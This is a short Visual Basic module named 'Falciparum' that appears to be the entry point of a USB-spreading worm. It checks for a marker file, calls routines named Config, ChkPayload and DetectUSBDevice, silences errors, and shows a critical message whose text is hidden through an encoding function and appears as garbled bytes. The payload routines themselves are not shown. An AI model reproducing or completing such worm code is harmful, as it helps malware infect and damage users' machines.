Attribute VB_Name = "Falciparum"
Public Sub Main()
On Error Resume Next
If Not FILE_EXISTS(UF(Fav) + Ec("����������")) Then 'Falc32.dat
        Call Config
        Call ChkPayload
        Else
        Call DetectUSBDevice
        Call ChkPayload
        MsgBox Ec("�������+��������������������������������������������������"), vbCritical, Ec("������������")
        End If
End Sub
